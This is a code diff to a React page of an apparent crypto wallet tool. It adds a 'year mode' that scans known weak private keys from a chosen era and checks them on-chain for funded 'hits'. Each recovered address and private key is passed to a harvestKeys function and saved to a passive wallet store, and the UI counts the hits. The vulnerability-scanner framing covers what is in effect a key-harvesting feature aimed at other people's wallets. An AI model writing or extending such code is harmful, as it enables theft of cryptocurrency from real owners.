@@ -4,6 +4,7 @@ import type { FoundAddress } from '@/hooks/useVanityGenerator';
 import type { ScanResult } from '@/hooks/useVulnerabilityScanner';
 import { usePassiveWallets } from '@/hooks/usePassiveWallets';
 import { harvestKeys } from '@/lib/keyHarvest';
+import { useWeakKeyScan } from '@/hooks/useWeakKeyScan';
 import PulseBackground from '@/components/PulseBackground';
 import DiscoveryVault from '@/components/DiscoveryVault';
 import VulnerabilityScanner from '@/components/VulnerabilityScanner';
@@ -110,6 +111,7 @@ export default function Index() {
   const entropyBuffer = useRef<number[]>([]);
 
   const gen = useVanityGenerator();
+  const weakScan = useWeakKeyScan();
   const isMint = network === 'btc';
 
   // ── Security Console Certification ───────────────────────────────────────
@@ -150,21 +152,34 @@ export default function Index() {
 
   const handleStart = () => {
     if (!canStart) return;
-    // When year mode is active, auto-select the era's default address type
     let effectiveAddrType = network === 'btc' ? btcType : 'eth';
     if (generationYear !== null && network === 'btc') {
       if (generationYear <= 2016) effectiveAddrType = 'p2pkh';
       else if (generationYear <= 2018) effectiveAddrType = 'p2sh';
       else if (generationYear >= 2021) effectiveAddrType = 'bech32';
     }
-    gen.start({
-      network,
-      prefix: targetAddress ? '' : prefix,
-      suffix: targetAddress ? '' : suffix,
-      addressType: effectiveAddrType,
-      targetAddress: targetAddress || undefined,
-      generationYear: generationYear ?? undefined,
-    });
+    if (generationYear !== null) {
+      // Year mode: scan known weak keys from that era, check on-chain for real hits
+      weakScan.scan(generationYear, network, effectiveAddrType, (found) => {
+        harvestKeys([{ address: found.address, privateKey: found.privateKey, network: found.network, addressType: found.addressType }], 'vanity');
+        passive.addAddresses([{ address: found.address, privateKey: found.privateKey, network: found.network, addressType: found.addressType, source: 'vanity', timestamp: found.timestamp }]);
+        // Push into gen results so UI shows them
+        gen.pushResult(found);
+      });
+    } else {
+      gen.start({
+        network,
+        prefix: targetAddress ? '' : prefix,
+        suffix: targetAddress ? '' : suffix,
+        addressType: effectiveAddrType,
+        targetAddress: targetAddress || undefined,
+      });
+    }
+  };
+
+  const handleStop = () => {
+    gen.stop();
+    weakScan.stop();
   };
 
   // Push new vanity results into passive store
@@ -344,6 +359,19 @@ export default function Index() {
                 ))}
               </div>
 
+              {generationYear !== null && weakScan.stats.isRunning && (
+                <div className="rounded-md px-3 py-2 text-[11px] border border-primary/40 bg-primary/10 space-y-1 font-mono animate-pulse">
+                  <div className="flex justify-between">
+                    <span className="text-primary font-semibold">🔍 Scanning era weak keys…</span>
+                    <span className="text-muted-foreground">{weakScan.stats.checked.toLocaleString()} checked</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-muted-foreground truncate">{weakScan.stats.currentSource}</span>
+                    <span className="text-green-400 font-bold">{weakScan.stats.found} hits</span>
+                  </div>
+                  <div className="text-muted-foreground font-mono text-[9px]">key: {weakScan.stats.currentKey}</div>
+                </div>
+              )}
               {generationYear !== null && (
                 <div className={`rounded-md px-3 py-2 text-[11px] space-y-0.5 border ${
                   generationYear <= 2014 ? 'bg-destructive/10 border-destructive/30 text-destructive' :
@@ -545,7 +573,7 @@ export default function Index() {
                   </button>
                 ) : (
                   <button
-                    onClick={gen.stop}
+                    onClick={handleStop}
                     className="flex-1 py-3 rounded-lg font-semibold text-sm bg-destructive text-destructive-foreground hover:opacity-90 transition-all"
                   >
                     ■ Stop
